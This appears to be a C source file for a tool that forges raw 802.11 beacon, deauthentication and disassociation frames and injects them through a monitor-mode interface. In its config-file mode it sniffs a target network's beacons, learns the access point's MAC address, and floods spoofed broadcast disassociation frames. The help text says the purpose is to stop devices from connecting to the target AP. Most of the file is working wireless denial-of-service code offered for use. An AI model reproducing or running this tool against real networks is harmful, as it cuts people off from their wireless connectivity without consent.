#include "send_message.h"

#define SSID "target_ssid"
#define MAC "allow_mac_list"
#define MAC_NUM "allow_mac_num"

uint16 add_country(uint8* buffer, struct frame_config* frame, int32 index) {
    //国家码
    uint16 result = index;
    buffer[result] = 7;
    result += 1;
    buffer[result] = 6;
    result += 1;
    memcpy(buffer+result, frame->country_code, 2);
    result += 2;
    memcpy(buffer+result, "\x20", 1);
    result += 1;
    int start_channel = 1;
    memcpy(buffer+result, &start_channel, 1);
    result += 1;
    int end_channel = 0;
    if (frame->country_code[0] == 'U' && frame->country_code[1] == 'S') {
        // US 1-11
        end_channel = 11;
    } else {
        // other 1-13
        end_channel = 13;
    }
    memcpy(buffer+result, &end_channel, 1);
    result += 1;
    memcpy(buffer+result, "\x1b", 1);
    result +=1;
    return result;
}

uint16 add_rsn(uint8* buffer, struct frame_config* frame, int32 index) {
    //安全类型
    uint16 result = index;
    buffer[result] = 48;
    result += 1;
    buffer[result] = 20;
    result += 1;
    memcpy(buffer+result, "\x01\x00", 2);
    result += 2;
    memcpy(buffer+result, "\x00\x0f\xac\x04", 4);
    result += 4;
    memcpy(buffer+result, "\x01\x00", 2);
    result += 2;
    memcpy(buffer+result, "\x00\x0f\xac\x04", 4);
    result += 4;
    memcpy(buffer+result, "\x01\x00", 2);
    result += 2;
    memcpy(buffer+result, "\x00\x0f\xac\x02", 4);
    result += 4;
    memcpy(buffer+result, "\x00\x00", 2);
    result += 2;
    return result;
}

uint16 add_ssid(uint8* buffer, struct frame_config* frame, int32 index) {
    uint16 result = index;
    buffer[result] = 0;
    result += 1;
    buffer[result] = frame->essid_len;
    result += 1;
    memcpy(buffer+result, frame->essid, frame->essid_len);
    result += frame->essid_len;
    return result;
}

uint16 create_frame(uint8* buffer, struct frame_config* frame) {
    uint16_t result = 0;
    // type
    if (frame->type == BEACON) {
        memcpy(buffer+result, "\x80\x00\x00\x00", 4);
    } else if (frame->type == DEAUTHENTICATION) {
        memcpy(buffer+result, "\xc0\x00\x3c\x00", 4);
    } else if (frame->type == DISASSOCIATE) {
        memcpy(buffer+result, "\xa0\x00\x00\x00", 4);
    }
    result += 4;
    //receiver addr : destination addr
    memcpy(buffer+result, frame->des_bssid, 6);
    result += 6;

    //transmitter / source addr
    memcpy(buffer+result, frame->source_bssid, 6);
    result += 6;

    //bssid
    memcpy(buffer+result, frame->source_bssid, 6);
    result += 6;

    if (frame->type != BEACON) {
        //帧分片
        memcpy(buffer+result, "\x40\x80", 2);
        result +=2;
        if (frame->type == DEAUTHENTICATION) {
            //reason code : Sta is leaving
            memcpy(buffer+result, "\x03\x00", 2);
        } else if (frame->type == DISASSOCIATE) {
            //reason code : Sta is leaving  disassociate all
            memcpy(buffer+result, "\x03\x00", 2);
        }
        result +=2;
    } else {
        //Fragment number
        buffer[result] = (uint8)(frame->seq_id&0xFF);
        result += 1;
        //Sequence number
        buffer[result] = (uint8)((frame->seq_id>>8)&0xFF);
        result += 1;
        frame->seq_id+=0x10;
        struct timeval t_time;
        gettimeofday(&t_time, 0);
        uint64 t_timestamp=((uint64)t_time.tv_sec)*1000000+t_time.tv_usec;
        uint8 t_i;
        //时间戳
        for (t_i = 0; t_i < 8; t_i++) {
             buffer[result+t_i] = (uint8)((t_timestamp>>(t_i<<3))&0xFF);
        }
        result += 8;
        memcpy(buffer+result, "\x64\x00\x01\x00", 4);
        result += 4;

        result = add_ssid(buffer, frame, result);
        result = add_country(buffer, frame, result);
        result = add_rsn(buffer, frame, result);
    }

    return result;
}

int32 create_raw_socket(char* iface) {
    int32 sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        printf("create_raw_socket failed");
        return -1;
    }
    //获取iface index
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, sizeof(ifr.ifr_name)-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        printf("create_raw_socket SIOCGIFINDEX failed");
        return -1;
    }
    //连接socket和iface
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        printf("create_raw_socket bind sock failed");
        return -1;
    }
    struct packet_mreq mr;
    memset(&mr, 0, sizeof(mr));
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type = PACKET_MR_PROMISC;
    if (setsockopt(sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0) {
        printf("create_raw_socket set sock opt failed");
        return -1;
    }
    return sock;
}

int32 send_frame(int32 sock, uint8* buffer, uint32 size) {
    uint8 t_buffer[4096];
    //radio头
    uint8* radiotap = (uint8*)"\x00\x00\x1e\x00\x2e\x40\x00\xa0\x20\x08\x00\xa0\x20\x08\x00\x00\x00\x0c\x3c\x14\x40\x01\xd5\x00\x00\x00\xd5\x00\xcf\x01";
    memcpy(t_buffer, radiotap, 30);
    memcpy(t_buffer + 30, buffer, size);
    size += 30;
    int32 t_size = write(sock, t_buffer, size);
    if (t_size < 0) {
        printf("send frame write failed");
        return -1;
    }
    return t_size;
}


int StringToHex(char *str, unsigned char *out, unsigned int *outlen)
{
    char *p = str;
    char high = 0, low = 0;
    int tmplen = strlen(p), cnt = 0;
    tmplen = strlen(p);
    while(cnt < (tmplen / 2))
    {
        high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
        low = (*(++ p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p) - 48 - 7 : *(p) - 48;
        out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
        p ++;
        cnt ++;
    }
    if(tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
    
    if(outlen != NULL) *outlen = tmplen / 2 + tmplen % 2;
    return tmplen / 2 + tmplen % 2;
}

void printHelp() {
    printf("./send_msg [type] [iface] [source mac] [des mac] [ssid] [country] [interval] [num]\n");
    printf("type             : 0(beacon) 1(deauthentication) 2(disassociate)\n");
    printf("iface            : nework device name (used monitor mode)\n");
    printf("source mac       : string format , like 112233445566\n");
    printf("des mac          : string format , like 112233445566\n");
    printf("ssid             : any string format\n");
    printf("country          : country code , like CN\n");
    printf("interval         : frame interval(ms), like 10000\n");
    printf("num              : frame number, 0:always send, other : send target num\n");
    printf("beacon           : use type/iface/source mac/ssid/country/interval\n");
    printf("beacon           : like ./send_msg 0 wlan0 112233445566 testap CN 10000 0\n");
    printf("deauthentication : use type/iface/source mac/des mac/interval\n");
    printf("deauthentication : like ./send_msg 1 wlan0 112233445566 aabbccddeeff 10000 10\n");
    printf("disassociate     : use type/iface/source mac/interval\n");
    printf("disassociate     : like ./send_msg 2 wlan0 112233445566 10000 10\n");
    printf("./send_msg : through config file， disable some deivces to connect target AP\n");
}

void init_frame(struct frame_config* frame, uint8* source_bssid, uint8* des_bssid,
           char* essid, char* country_code, char* iface, uint8 interval, uint8 type) {
    uint8 out_source_bss[12], out_des_bss[12];
    unsigned int out_source_bss_len = 0, out_des_bss_len = 0;
    StringToHex(source_bssid, out_source_bss, &out_source_bss_len);
    StringToHex(des_bssid, out_des_bss, &out_des_bss_len);

    memcpy(frame->source_bssid, out_source_bss, 6);
    memcpy(frame->des_bssid, out_des_bss, 6);

    frame->seq_id = 0;
    uint32 len = strlen(essid);
    if (len > 32) {
        len = 32;
    }
    frame->essid_len = len;
    memcpy(frame->essid, essid, len);
    memcpy(frame->country_code, country_code, 2);
    uint32 iface_len = strlen(iface);
    if (iface_len > 32) {
        iface_len = 32;
    }
    memcpy(frame->iface, iface, iface_len);
    if (iface_len != 32) {
        frame->iface[iface_len] = '\0';
    }
    frame->interval = interval;
    frame->type = type;
}

void printfError() {
    printf("error parameter , please reference ./send_msg h\n");
}

void autoSendFrame(int32 sock, uint8* buffer,struct frame_config* frame, uint8 num) {
    int frame_num = num;
    //printf("autoSendFrame\n\n");
    if (frame_num) {
        while (frame_num) {
            //for (int i = 0; i < 6; i++) {
            //    printf("%02x", frame->source_bssid[i]);
            //}
            //printf("\n\n");
            uint16 len = create_frame(buffer, frame);
            printf("%s :----: %d\n", frame->iface,send_frame(sock, buffer, len));
            usleep(frame->interval);
            frame_num--;
        }
    } else {
        while (1) {
            uint16 len = create_frame(buffer, frame);
            printf("%s :----: %d\n", frame->iface,send_frame(sock, buffer, len));
            usleep(frame->interval);
        }
    }

}

struct disable_config config;
uint8 disallow_mac_list[10][6];

void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packetData) {
    // 跳过Radiotap头部，如果有的话
    int offset = 0;
    if (packetData[0] == 0x00 && packetData[1] == 0x00) {
        offset = packetData[2];
    }

    // 获取帧控制字段
    unsigned short frameControl = (packetData[offset + 0x0E] << 8) | packetData[offset + 0x0F];

    // 判断是否为Beacon帧
    if ((frameControl & 0x0080) == 0x0080) {
        // Beacon帧
        int index = offset + 36;  // 从Beacon帧的标签字段开始查找
        int flag = 0;
        while (index < pkthdr->len) {
            unsigned char tagType = packetData[index];
            unsigned char tagLength = packetData[index + 1];
            if (tagType == 0x00) {  // 标签类型为SSID
                char ssid[tagLength+1];
                for (int i = 0; i < tagLength; i++) {
                    ssid[i] = packetData[index + 2 + i];
                }
                ssid[tagLength] = '\0';
                if (memcmp(config.ssid, ssid, tagLength+1) == 0) {
                    printf("filter beacon : %s\n", config.ssid);
                    flag = 1;
                    break;
                } else {
                    return;
                }
            }
            index += tagLength + 2;  // 跳过当前标签字段
        }
        if (!flag) {
            return;
        }
        //copy mac
        uint8 des_addr[6];
        uint8 source_addr[6];
        uint8 mac_addr[6];
        index = offset + 4;
        printf("target mac:");
        for (int i = 0; i < 18 ; i++) {
            if (i < 6) {
                des_addr[i] = packetData[index+i];
            } else if (i < 12) {
                source_addr[i-6] =  packetData[index+i];
            } else {
                mac_addr[i-12] =  packetData[index+i];
                printf("%02x", packetData[index+i]);
            }
        }
        printf("\n\n");
        memcpy(config.ap_bssid, mac_addr, 6);
    } else {
        //printf("no beacon\n");
    }
}

void init_disable_config(struct disable_config* config) {
    FILE *fp = NULL;
    uint8 buf[1024];
    int len;
    fp = fopen("disable_config","r");
    while (fgets(buf, 1024, fp) != NULL) {
        len = strlen(buf);
        buf[len-1] = '\0';
        if (buf[0] == '#') {
            continue;
        }
        if (memcmp(SSID, buf, 11) == 0) {
            int ssid_len = len - 12;
            char ssid[ssid_len];
            for (int i = 0; i < ssid_len; i++) {
               printf("%c", buf[12 + i]);
               ssid[i] = buf[12 + i];
            }
            memcpy(config->ssid, ssid, ssid_len);
            continue;
        }
        printf("\n\n");
        if (memcmp(MAC_NUM, buf, 13) == 0) {
            config->allow_bssid_num = buf[14];
            continue;
        }
        if (memcmp(MAC, buf, 14) == 0) {
            int num = config->allow_bssid_num - '0';
            for (int i = 0; i < num; i++) {
                //[12] is \0
                char bssid[13];
                uint8 out_bssid[12];
                uint32 bss_len = 0;
                for (int j = 0; j < 12; j++) {
                    bssid[j] = buf[15 + i*13 + j];
                }
                StringToHex(bssid, out_bssid, &bss_len);
                memcpy(config->bssids[i], out_bssid, 6);
            }
            continue;
        }
    }
    fclose(fp);
}

int main(int argc, char *argv[])
{
    if (argc == 1) {
       struct frame_config frame;
       uint8 buffer[1024];
       uint8 interval = atoi("10000");
       //初始化配置文件
       init_disable_config(&config);

       char errbuf[PCAP_ERRBUF_SIZE];
       pcap_t *handle;
       struct pcap_pkthdr header;
       const u_char *packet;
       handle = pcap_open_live("mon1", BUFSIZ, 1, 1000, errbuf);
       if (handle == NULL) {
           printf("open live failed\n");
           return 0;
       } 
       struct bpf_program fp;
       //assoc-req, assoc-resp, reassoc-req, reassoc-resp, probe-req, probe-resp, beacon, atim, disassoc, auth, deauth.
       char filter_beacon_exp[] = "type mgt subtype beacon";
       //filter_beacon_exp获取目标ap mac
       if (pcap_compile(handle, &fp, filter_beacon_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
           printf("pcap_compile failed\n");
           return 0;
       }

       if (pcap_setfilter(handle, &fp) == -1) {
           printf("pcap_setfilter failed\n");
           return 0;
       }

       //get Target AP mac addr
       pcap_loop(handle, 50, packet_handler, NULL);
       pcap_close(handle);

       printf("beacon filter pcap is closed\n");

       //send disassociate all
       init_frame(&frame, "112233445566", "ffffffffffff", "disassociate", "CN", "mon1", interval, DISASSOCIATE);
       //copy really bssid to source
       memcpy(frame.source_bssid, config.ap_bssid, 6);
       int32 sock = create_raw_socket("mon1");
       autoSendFrame(sock, buffer, &frame, 50);

       /*
       handle = pcap_open_live("mon1", BUFSIZ, 1, 1000, errbuf);

       if (handle == NULL) {
           printf("open live failed\n");
           return 0;
       } 

       char filter_assoc_req_exp[] = "type mgt subtype probe-req";
       if (pcap_compile(handle, &fp, filter_assoc_req_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
           printf("pcap_compile failed\n");
           return 0;
       }

       if (pcap_setfilter(handle, &fp) == -1) {
           printf("pcap_setfilter failed\n");
           return 0;
       }
       pcap_loop(handle, 50, packet_handler, NULL);
       pcap_close(handle);
       */

       //printfError();

    } else if (argc == 2) {
        if (argv[1][0] == 'h') {
            printHelp();
        }
    } else {
        uint8 buffer[1024];
        char* iface;
        char* source_mac;
        char* des_mac;
        uint8 interval;
        uint8 frame_num;
        if (argv[1][0] == '0') {
            if (argc == 8) {
                char* ssid;
                char* country;
                iface = argv[2];
                source_mac = argv[3];
                ssid = argv[4];
                country = argv[5];
                //country = "\x00\x00";
                interval = atoi(argv[6]);
                frame_num = atoi(argv[7]);
                des_mac = "ffffffffffff";
                struct frame_config frame;
                init_frame(&frame, source_mac, des_mac, ssid, country, iface, interval, BEACON);
                int32 sock = create_raw_socket(iface);
                autoSendFrame(sock, buffer, &frame, frame_num);
            } else {
                printfError();
            }
        } else if (argv[1][0] == '1') {
            if (argc == 7) {
                char* ssid = "deauthentication";
                char* country = "CN";
                iface = argv[2];
                source_mac = argv[3];
                des_mac = argv[4];
                interval = atoi(argv[5]);
                frame_num = atoi(argv[6]);
                struct frame_config frame;
                init_frame(&frame, source_mac, des_mac, ssid, country, iface, interval, DEAUTHENTICATION);
                int32 sock = create_raw_socket(iface);
                autoSendFrame(sock, buffer, &frame, frame_num);
            } else {
                printfError();
            }
        } else if (argv[1][0] == '2') {
            if (argc == 6) {
                char* ssid = "disassociate";
                char* country = "CN";
                iface = argv[2];
                source_mac = argv[3];
                interval = atoi(argv[4]);
                frame_num = atoi(argv[5]);
                des_mac = "ffffffffffff";
                struct frame_config frame;
                init_frame(&frame, source_mac, des_mac, ssid, country, iface, interval, DISASSOCIATE);
                int32 sock = create_raw_socket(iface);
                autoSendFrame(sock, buffer, &frame, frame_num);
            } else {
                printfError();
            }
        } else {
            printfError();
            return 0;
        }
    }
    return 0;
}

